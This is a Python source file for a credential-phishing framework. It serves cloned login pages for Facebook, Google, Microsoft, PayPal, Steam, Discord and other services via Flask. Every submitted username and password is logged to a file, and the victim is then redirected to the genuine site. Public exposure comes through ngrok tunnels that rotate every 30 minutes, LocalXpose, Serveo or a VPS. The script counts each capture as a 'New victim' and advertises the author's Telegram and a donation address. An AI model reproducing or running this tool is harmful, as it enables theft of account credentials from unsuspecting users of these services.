import os
import sys
import socket
import threading
import json
import time
import random
import requests
import subprocess
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, send_from_directory, redirect
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from pyngrok import ngrok, conf
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False

BASE_DIR = Path(__file__).parent
TEMPLATES_DIR = BASE_DIR
DUMP_DIR = BASE_DIR / "SECURE_DATA"
DUMP_DIR.mkdir(exist_ok=True)

TEMPLATES = {
    "1": "facebook", "2": "discord", "3": "google", "4": "google_new",
    "5": "microsoft", "6": "paypal", "7": "steam", "8": "roblox",
    "9": "linkedin", "10": "wordpress", "11": "garena"
}

REDIRECT_MAP = {
    "facebook": "https://www.facebook.com",
    "discord": "https://discord.com/login", 
    "google": "https://accounts.google.com",
    "google_new": "https://accounts.google.com",
    "microsoft": "https://login.microsoftonline.com",
    "paypal": "https://www.paypal.com",
    "steam": "https://store.steampowered.com/login",
    "roblox": "https://www.roblox.com/login",
    "linkedin": "https://www.linkedin.com",
    "wordpress": "https://wordpress.com/log-in",
    "garena": "https://ff.garena.com"
}

app = Flask(__name__, static_folder=None)
CURRENT_TEMPLATE = ""
SERVER_THREAD = None

LOCAL_IP = socket.gethostbyname(socket.gethostname())

def find_free_port(start=8000):
    for port in range(start, 9000):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", port))
                return port
            except:
                continue
    return 8000

def log_credentials(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {data}\n"
    with open(DUMP_DIR / "credentials.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)
    print(f"[SUCCESS] CAPTURED -> {data}")

def print_status(msg, msg_type="info"):
    colors = {
        "success": "\033[92m",
        "error": "\033[91m", 
        "info": "\033[94m",
        "warning": "\033[93m"
    }
    print(f"{colors.get(msg_type, '')}[{msg_type.upper()}] {msg}\033[0m")

class TunnelManager:
    def __init__(self):
        self.current_url = None
        self.tunnel_type = None
        
    def start_localhost(self, port):
        print_status(f"Local: http://{LOCAL_IP}:{port}", "info")
        print_status(f"Network: http://YOUR_IP:{port}", "info")
        return None
        
    def start_ngrok(self, port):
        if not NGROK_AVAILABLE:
            print_status("pyngrok not installed", "error")
            return None
            
        try:
            ngrok.kill()
            time.sleep(2)
            
            regions = ["us", "eu", "ap", "au", "sa", "jp", "in"]
            region = random.choice(regions)
            
            conf.get_default().region = region
            
            tunnel = ngrok.connect(port, "http")
            self.current_url = tunnel.public_url
            self.tunnel_type = "ngrok"
            
            print_status(f"Ngrok URL: {self.current_url}", "success")
            print_status(f"Region: {region}", "info")
            
            threading.Thread(target=self.rotate_ngrok, args=(port,), daemon=True).start()
            return self.current_url
            
        except Exception as e:
            print_status(f"Ngrok failed: {e}", "error")
            return None
            
    def rotate_ngrok(self, port):
        while True:
            time.sleep(1800)
            if self.tunnel_type == "ngrok":
                print_status("Rotating ngrok tunnel...", "warning")
                self.start_ngrok(port)
                
    def start_localxpose(self, port):
        try:
            result = subprocess.run(["localxpose", "version"], capture_output=True, text=True)
            if result.returncode != 0:
                print_status("localxpose not installed", "error")
                return None
                
            subprocess.Popen(["localxpose", "http", str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            
            try:
                response = requests.get("http://localhost:4040/api/tunnels")
                data = response.json()
                if data['tunnels']:
                    self.current_url = data['tunnels'][0]['public_url']
                    self.tunnel_type = "localxpose"
                    print_status(f"LocalXpose URL: {self.current_url}", "success")
                    return self.current_url
            except:
                print_status("Could not get LocalXpose URL", "error")
                return None
                
        except Exception as e:
            print_status(f"LocalXpose error: {e}", "error")
            return None
            
    def start_serveo(self, port):
        try:
            import paramiko
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect('serveo.net', username='', password='')
            transport = client.get_transport()
            
            channel = transport.open_channel('direct-tcpip', ('127.0.0.1', port), ('127.0.0.1', port))
            if channel:
                self.current_url = f"https://{socket.gethostname()}.serveo.net"
                self.tunnel_type = "serveo"
                print_status(f"Serveo URL: {self.current_url}", "success")
                return self.current_url
                
        except Exception as e:
            print_status(f"Serveo failed: {e}", "error")
            return None
            
    def start_vps(self, vps_ip, port):
        print_status(f"VPS Setup: ssh -R 80:localhost:{port} serveo.net", "info")
        print_status(f"Or use: ./chisel client {vps_ip}:8080 R:80:localhost:{port}", "info")
        print_status("Configure your VPS manually", "warning")
        return f"http://{vps_ip}"

@app.route("/")
def index():
    path = TEMPLATES_DIR / CURRENT_TEMPLATE
    files = ["index.html", "login.html", "index.php", "login.php"]
    for f in files:
        file_path = path / f
        if file_path.exists():
            with open(file_path, "r", encoding="utf-8") as ff:
                return ff.read()
    return "Page not found", 404

@app.route("/<path:filename>")
def static_files(filename):
    file_path = TEMPLATES_DIR / CURRENT_TEMPLATE / filename
    if file_path.exists():
        return send_from_directory(TEMPLATES_DIR / CURRENT_TEMPLATE, filename)
    return "File not found", 404

@app.route("/login.php", methods=["POST"])
@app.route("/login", methods=["POST"])
def login():
    data = {k: v for k, v in request.form.items()}
    log_credentials(json.dumps(data, ensure_ascii=False))
    return redirect(REDIRECT_MAP.get(CURRENT_TEMPLATE, "https://google.com"))

def start_server(host, port):
    try:
        app.run(host=host, port=port, threaded=True, debug=False, use_reloader=False)
    except Exception as e:
        print_status(f"Server error: {e}", "error")

def check_dependencies():
    missing = []
    
    if not FLASK_AVAILABLE:
        missing.append("flask")
        
    if missing:
        print_status(f"Installing: {', '.join(missing)}", "warning")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print_status("Dependencies installed", "success")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except:
            print_status("Installation failed", "error")
            return False
    return True

def get_input(prompt, default=""):
    """بديل آمن لـ input() يعمل مع PyInstaller"""
    try:
        if default:
            user_input = input(f"{prompt} [{default}]: ").strip()
            return user_input if user_input else default
        else:
            return input(f"{prompt}: ").strip()
    except (EOFError, RuntimeError):
        # إذا فشل input، استخدم القيم الافتراضية
        print_status(f"Using default: {default}", "warning")
        return default

def main():
    if not check_dependencies():
        return
        
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = """
\033[91m
███╗   ███╗ ██████╗ ███╗   ██╗███████╗████████╗██████╗ 
████╗ ████║██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝██╔══██╗
██╔████╔██║██║   ██║██╔██╗ ██║███████╗   ██║   ██████╔╝
██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██╗
██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║   ██║   ██║  ██║
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
\033[94m              ███╗   ███╗ ██╗ ███╗   ██╗██████╗ 
              ████╗ ████║ ██║ ████╗  ██║██╔══██╗
              ██╔████╔██║ ██║ ██╔██╗ ██║██║  ██║
              ██║╚██╔╝██║ ██║ ██║╚██╗██║██║  ██║
              ██║ ╚═╝ ██║ ██║ ██║ ╚████║██████╔╝
              ╚═╝     ╚═╝ ╚═╝ ╚═╝  ╚═══╝╚═════╝ 
\033[0m
"""
    print(banner)
    print("=" * 60)
    print("CREATED BY: MØNSTR-M1ND")
    print("MER7BA CONTACT TELEGRAM: https://t.me/monstr_m1nd")
    print("WELA B4ETI Z3MA BTC DONATION: 12w4jBxtUopH29c31HVaUxUquwDzGiwk8a")
    print("PHISHING DYAL JUMIA MHM 9DI BIHA WSAFI HHHH FRAMEWORK")
    print("=" * 60)
    
    print("\n[TEMPLATES]")
    for key, name in TEMPLATES.items():
        print(f"  [{key}] {name.upper()}")
    
    # استخدام القيم الافتراضية بدلاً من input
    global CURRENT_TEMPLATE
    CURRENT_TEMPLATE = "facebook"  # قيمة افتراضية
    
    # محاولة الحصول على الإدخال أو استخدام الافتراضي
    try:
        choice = get_input("Select template", "1")
        if choice in TEMPLATES:
            CURRENT_TEMPLATE = TEMPLATES[choice]
        else:
            CURRENT_TEMPLATE = TEMPLATES["1"]
    except:
        CURRENT_TEMPLATE = TEMPLATES["1"]
    
    template_path = TEMPLATES_DIR / CURRENT_TEMPLATE
    if template_path.exists():
        print_status(f"Loaded: {CURRENT_TEMPLATE}", "success")
    else:
        print_status("Template folder missing, using default", "error")
        CURRENT_TEMPLATE = "facebook"
    
    host = get_input("Host", "0.0.0.0")
    port = find_free_port()
    print_status(f"Using port: {port}", "info")
    
    print("\n[TUNNEL OPTIONS]")
    print("  [1] Local Network")
    print("  [2] Ngrok (Auto-rotate)")
    print("  [3] LocalXpose")
    print("  [4] Serveo") 
    print("  [5] VPS Manual")
    print("  [6] Cloudflare Tunnel")
    
    tunnel_manager = TunnelManager()
    public_url = None
    
    # استخدام القيمة الافتراضية للنفق
    try:
        tunnel_choice = get_input("Select tunnel", "1")
    except:
        tunnel_choice = "1"
    
    if tunnel_choice == "1":
        tunnel_manager.start_localhost(port)
    elif tunnel_choice == "2":
        public_url = tunnel_manager.start_ngrok(port)
    elif tunnel_choice == "3":
        public_url = tunnel_manager.start_localxpose(port)
    elif tunnel_choice == "4":
        public_url = tunnel_manager.start_serveo(port)
    elif tunnel_choice == "5":
        vps_ip = get_input("VPS IP", "192.168.1.1")
        public_url = tunnel_manager.start_vps(vps_ip, port)
    elif tunnel_choice == "6":
        print_status("Install: npm install -g cloudflared", "info")
        print_status("Run: cloudflared tunnel --url localhost:PORT", "info")
    else:
        tunnel_manager.start_localhost(port)
    
    print_status("Starting server...", "info")
    
    server_thread = threading.Thread(target=start_server, args=(host, port), daemon=True)
    server_thread.start()
    
    time.sleep(2)
    
    print_status("Server is running...", "success")
    print_status("Press Ctrl+C to stop", "warning")
    
    if public_url:
        print_status(f"Public URL: {public_url}", "success")
    
    victim_count = 0
    try:
        while True:
            time.sleep(1)
            if os.path.exists(DUMP_DIR / "credentials.txt"):
                with open(DUMP_DIR / "credentials.txt", "r") as f:
                    new_count = len(f.readlines())
                    if new_count > victim_count:
                        print_status(f"New victim! Total: {new_count}", "success")
                        victim_count = new_count
    except KeyboardInterrupt:
        print_status("Shutting down...", "warning")
        if NGROK_AVAILABLE:
            try:
                ngrok.kill()
            except:
                pass

if __name__ == "__main__":
    main()